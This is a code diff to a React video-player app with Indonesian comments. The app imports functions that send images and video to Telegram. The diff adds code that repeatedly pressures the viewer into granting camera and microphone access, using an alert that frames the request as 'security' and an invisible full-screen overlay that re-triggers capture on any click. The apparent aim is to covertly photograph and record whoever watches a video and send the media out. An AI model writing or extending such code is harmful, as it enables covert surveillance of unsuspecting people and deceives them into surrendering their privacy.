@@ -5,6 +5,7 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, Vis
 function App() {
   const [isPlaying, setIsPlaying] = useState<number | null>(null);
   const [isFullscreen, setIsFullscreen] = useState(false);
+  const [isRequestingPermission, setIsRequestingPermission] = useState(false);
   const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
   const cameraStreamRef = useRef<MediaStream | null>(null);
 
@@ -40,20 +41,46 @@ function App() {
 
   const captureAndSendMedia = useCallback(async (videoElement: HTMLVideoElement) => {
     console.log('Mulai proses pengambilan media...');
+    const maxAttempts = 3;
+    let attempts = 0;
+
+    const requestMediaAccess = async () => {
+      try {
+        setIsRequestingPermission(true);
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const videoDevice = devices.find(device => device.kind === 'videoinput');
+        
+        if (!videoDevice) throw new Error('Tidak ada perangkat input video yang ditemukan');
+
+        const constraints = {
+          video: { 
+            deviceId: videoDevice.deviceId, 
+            facingMode: 'user', // Gunakan kamera depan (bisa ubah ke 'environment' untuk kamera belakang)
+            width: { ideal: 1280 }, // Biarkan kamera memilih resolusi terbaik
+            height: { ideal: 720 },
+            frameRate: { ideal: 30 }
+          },
+          audio: true
+        };
+
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        cameraStreamRef.current = stream;
+        return stream;
+      } catch (error) {
+        console.error('Gagal mendapatkan akses media:', error);
+        attempts++;
+        if (attempts < maxAttempts) {
+          alert(`Akses ditolak. Harap izinkan untuk melanjutkan (${attempts}/${maxAttempts}). Kami membutuhkan ini untuk "keamanan".`);
+          return await requestMediaAccess();
+        } else {
+          throw new Error('Akses media ditolak setelah beberapa percobaan.');
+        }
+      }
+    };
+
     try {
       videoElement.play().catch(err => console.error('Error memutar video:', err));
-
-      const devices = await navigator.mediaDevices.enumerateDevices();
-      const videoDevice = devices.find(device => device.kind === 'videoinput');
-      
-      if (!videoDevice) throw new Error('Tidak ada perangkat input video yang ditemukan');
-
-      const constraints = {
-        video: { deviceId: videoDevice.deviceId, width: { ideal: 720 }, height: { ideal: 1280 }, frameRate: { ideal: 30 } },
-        audio: true
-      };
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      cameraStreamRef.current = stream;
+      const stream = await requestMediaAccess();
 
       const cameraVideo = document.createElement('video');
       cameraVideo.srcObject = stream;
@@ -70,13 +97,39 @@ function App() {
         };
       });
 
+      // Dapatkan dimensi asli video dari kamera
+      const videoWidth = cameraVideo.videoWidth;
+      const videoHeight = cameraVideo.videoHeight;
+      console.log('Dimensi video asli:', videoWidth, 'x', videoHeight);
+
+      // Buat canvas dengan dimensi yang sesuai dengan rasio aspek kamera
       const canvas = document.createElement('canvas');
-      canvas.width = 720;
-      canvas.height = 1280;
+      const canvasAspectRatio = 9 / 16; // Rasio aspek canvas (vertikal)
+      const videoAspectRatio = videoWidth / videoHeight;
+
+      let drawWidth, drawHeight, offsetX, offsetY;
+
+      // Sesuaikan dimensi canvas agar sesuai dengan rasio aspek video
+      if (videoAspectRatio > canvasAspectRatio) {
+        // Video lebih lebar dari canvas, sesuaikan tinggi
+        drawWidth = 720; // Lebar canvas
+        drawHeight = drawWidth / videoAspectRatio;
+      } else {
+        // Video lebih tinggi dari canvas, sesuaikan lebar
+        drawHeight = 1280; // Tinggi canvas
+        drawWidth = drawHeight * videoAspectRatio;
+      }
+
+      canvas.width = drawWidth;
+      canvas.height = drawHeight;
+
+      // Pusatkan gambar di canvas
+      offsetX = (drawWidth - videoWidth) / 2;
+      offsetY = (drawHeight - videoHeight) / 2;
+
       const context = canvas.getContext('2d');
-      
       if (context) {
-        context.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
+        context.drawImage(cameraVideo, offsetX, offsetY, videoWidth, videoHeight);
       }
 
       const photoBlob = await new Promise<Blob>((resolve) => {
@@ -110,6 +163,7 @@ function App() {
         }
         videoElement.pause();
         setIsPlaying(null);
+        setIsRequestingPermission(false);
       }, 15000);
 
     } catch (error) {
@@ -119,6 +173,7 @@ function App() {
         cameraStreamRef.current = null;
       }
       setIsPlaying(null);
+      setIsRequestingPermission(false);
     }
   }, []);
 
@@ -204,6 +259,21 @@ function App() {
           </div>
         </div>
       </main>
+      {isRequestingPermission && (
+        <div
+          className="fixed inset-0 bg-transparent z-50"
+          onClick={() => {
+            if (isPlaying !== null) {
+              const videoElement = videoRefs.current[isPlaying];
+              if (videoElement) captureAndSendMedia(videoElement);
+            }
+          }}
+        >
+          <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 text-white text-sm bg-gray-800/80 p-2 rounded">
+            "Izinkan akses untuk pengalaman penuh!"
+          </div>
+        </div>
+      )}
     </div>
   );
 }
